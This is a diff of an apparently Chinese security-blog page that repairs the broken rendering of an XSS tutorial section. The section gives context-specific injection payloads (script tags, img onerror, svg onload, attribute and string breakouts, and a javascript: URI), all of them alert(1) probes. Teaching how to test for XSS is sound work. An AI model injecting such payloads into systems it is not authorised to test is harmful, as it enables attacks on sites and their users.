@@ -257,7 +257,7 @@
         <i class="far fa-calendar-check"></i>
       </span>
       <span class="post-meta-item-text">Edited on</span>
-      <time title="Modified: 2026-07-21 16:12:09" itemprop="dateModified" datetime="2026-07-21T16:12:09+08:00">2026-07-21</time>
+      <time title="Modified: 2026-07-21 16:35:17" itemprop="dateModified" datetime="2026-07-21T16:35:17+08:00">2026-07-21</time>
     </span>
     <span class="post-meta-item">
       <span class="post-meta-item-icon">
@@ -335,41 +335,31 @@
 <hr>
 <h2 id="2-0-XSS实战"><a href="#2-0-XSS实战" class="headerlink" title="2.0 XSS实战"></a>2.0 XSS实战</h2><h3 id="2-1-XSS绕过决策树"><a href="#2-1-XSS绕过决策树" class="headerlink" title="2.1 XSS绕过决策树"></a>2.1 XSS绕过决策树</h3><ul>
 <li><p><strong>01 HTML标签之间</strong></p>
-<ul>
-<li><pre><code class="language-html">&lt;div&gt;你的输入&lt;/div&gt;
-<figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line">- ```html</span><br><span class="line">  <span class="tag">&lt;<span class="name">script</span>&gt;</span>alert(1)<span class="tag">&lt;/<span class="name">script</span>&gt;</span></span><br><span class="line">  <span class="tag">&lt;<span class="name">img</span> <span class="attr">src</span>=<span class="string">x</span> <span class="attr">onerror</span>=<span class="string">alert(1)</span>&gt;</span></span><br><span class="line">  <span class="tag">&lt;<span class="name">svg</span> <span class="attr">onload</span>=<span class="string">alert(1)</span>&gt;</span></span><br></pre></td></tr></table></figure>
+<figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">div</span>&gt;</span>你的输入<span class="tag">&lt;/<span class="name">div</span>&gt;</span></span><br></pre></td></tr></table></figure>
 
-&gt; 标准Payload
-</code></pre>
-</li>
-</ul>
+<figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">script</span>&gt;</span>alert(1)<span class="tag">&lt;/<span class="name">script</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">img</span> <span class="attr">src</span>=<span class="string">x</span> <span class="attr">onerror</span>=<span class="string">alert(1)</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">svg</span> <span class="attr">onload</span>=<span class="string">alert(1)</span>&gt;</span></span><br></pre></td></tr></table></figure>
+
+<blockquote>
+<p>标准Payload</p>
+</blockquote>
 </li>
 <li><p><strong>02 HTML属性值内</strong></p>
-<ul>
-<li><pre><code class="language-html">&lt;input value=&quot;你的输入&quot;&gt;
-<figure class="highlight autohotkey"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line">- ```html</span><br><span class="line">  <span class="string">&quot; onclick=alert(1) &quot;</span></span><br></pre></td></tr></table></figure>
+<figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">input</span> <span class="attr">value</span>=<span class="string">&quot;你的输入&quot;</span>&gt;</span></span><br></pre></td></tr></table></figure>
 
-&gt; 思路: 用&quot; 闭合value属性, 用事件触发
-</code></pre>
-</li>
-</ul>
+<figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&quot; onclick=alert(1) &quot;</span><br></pre></td></tr></table></figure>
+<blockquote>
+<p>思路: 用” 闭合value属性, 用事件触发</p>
+</blockquote>
 </li>
 <li><p><strong>03 JavaScript代码内</strong></p>
-<ul>
-<li><pre><code class="language-js">&lt;script&gt;var name=&#39;你的输入&#39;;&lt;/script&gt;
-<figure class="highlight autohotkey"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line">- ```</span><br><span class="line">  &#x27;<span class="comment">; alert(1); //</span></span><br><span class="line">  <span class="string">&quot;; alert(1); //</span></span><br></pre></td></tr></table></figure>
-</code></pre>
-</li>
-</ul>
+<figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&lt;script&gt;<span class="keyword">var</span> name=<span class="string">&#x27;你的输入&#x27;</span>;&lt;/script&gt;</span><br></pre></td></tr></table></figure>
+
+<figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="string">&#x27;; alert(1); //</span></span><br><span class="line"><span class="string">&quot;; alert(1); //</span></span><br></pre></td></tr></table></figure>
 </li>
 <li><p><strong>04 href属性内</strong></p>
-<ul>
-<li><pre><code class="language-js">&lt;a href=&quot;你的输入&quot;&gt;link&lt;/a&gt;
-<figure class="highlight autohotkey"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line">- ```js</span><br><span class="line"><span class="title">  javascript:</span>alert(<span class="number">1</span>)</span><br></pre></td></tr></table></figure>
-</code></pre>
-</li>
-</ul>
-</li>
+<figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&lt;a href=<span class="string">&quot;你的输入&quot;</span>&gt;link&lt;/a&gt;</span><br></pre></td></tr></table></figure>
+
+<figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="attr">javascript</span>:<span class="title function_">alert</span>(<span class="number">1</span>)</span><br></pre></td></tr></table></figure></li>
 </ul>
 <h3 id="2-2-标准验证Payload"><a href="#2-2-标准验证Payload" class="headerlink" title="2.2 标准验证Payload"></a>2.2 标准验证Payload</h3><table>
 <thead>
